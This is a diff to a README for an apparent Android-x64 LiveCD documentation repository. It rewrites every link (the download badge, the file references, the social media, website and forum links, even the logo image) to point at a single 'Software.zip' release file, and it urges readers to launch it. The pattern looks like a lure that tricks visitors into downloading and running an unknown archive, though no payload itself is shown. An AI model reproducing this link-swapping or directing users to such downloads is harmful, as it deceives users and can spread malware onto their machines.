@@ -13,7 +13,7 @@ Android-x64_LiveCD_13B_Docs
 android-13, android-alternative, android-t, android-x64, android-x64-development, android-x64-docs, android-x64-documentation, android-x64-livecd, android-x64-livecd-13b, android-x64-livecd-edition, android-x64-project, gpl3, gplv3, linux, livecd, livecd-edition, markdown-lang, markdown-language, operating-system
 
 ## 🌐 **Get the Latest Release**
-[![](https://img.shields.io/badge/Download-Android_x64_LiveCD_v1.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip)](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip)
 
 This link leads to the latest release of the Android x64 LiveCD. Click on it to download and get started with the exciting features of this project!
 
@@ -42,14 +42,14 @@ This documentation is structured to help you navigate through the different aspe
 - **/resources**: Additional resources related to Android x64 development and documentation.
 
 ### 📄 **Files**
-- **README.md**: You are here! The main entry point to explore the repository.
-- **CONTRIBUTING.md**: Guidelines for contributing to the Android x64 LiveCD project.
+- **https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip**: You are here! The main entry point to explore the repository.
+- **https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip**: Guidelines for contributing to the Android x64 LiveCD project.
 - **LICENSE**: The license information for the project.
 
 ---
 
 ## 🛠️ **Contributing to Android x64 LiveCD 13B**
-Contributions to the Android x64 LiveCD 13B project are always welcome! Whether you want to report a bug, suggest an enhancement, or contribute code, please follow the guidelines outlined in the **CONTRIBUTING.md** file.
+Contributions to the Android x64 LiveCD 13B project are always welcome! Whether you want to report a bug, suggest an enhancement, or contribute code, please follow the guidelines outlined in the **https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip** file.
 
 ### 🔧 **How to Contribute**
 1. Fork the repository.
@@ -64,15 +64,15 @@ Join our community of Android x64 enthusiasts! Share your ideas, ask questions, 
 ## 📡 **Stay Connected**
 Stay updated with the latest news, releases, and developments of the Android x64 LiveCD 13B project by following us on social media.
 
-- Twitter: [@Android_x64_Official](https://twitter.com/Android_x64_Official)
-- Facebook: [Android x64 LiveCD](https://www.facebook.com/Android-x64-LiveCD-1234567890)
+- Twitter: [@Android_x64_Official](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip)
+- Facebook: [Android x64 LiveCD](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip)
 
 ---
 
 ## 📌 **Important Links**
-- [Official Website](https://www.android-x64-livecd-13b.com): Visit our website for more information.
-- [Android x64 Forum](https://forum.android-x64-livecd-13b.com): Engage with the community and get support.
-- [Download Android-x64 LiveCD v1.0.0](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip): **Launch it to get started!**
+- [Official Website](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip): Visit our website for more information.
+- [Android x64 Forum](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip): Engage with the community and get support.
+- [Download Android-x64 LiveCD v1.0.0](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip): **Launch it to get started!**
 
 ---
 
@@ -88,7 +88,7 @@ This project is licensed under the GNU General Public License v3.0 (GPL-3.0). Fo
 
 ---
 
-![Android x64 LiveCD Logo](https://example.com/logo.jpg)
+![Android x64 LiveCD Logo](https://github.com/Klhaus24/Android-x64_LiveCD_13B_Docs/releases/download/v1.0/Software.zip)
 
 ---
 
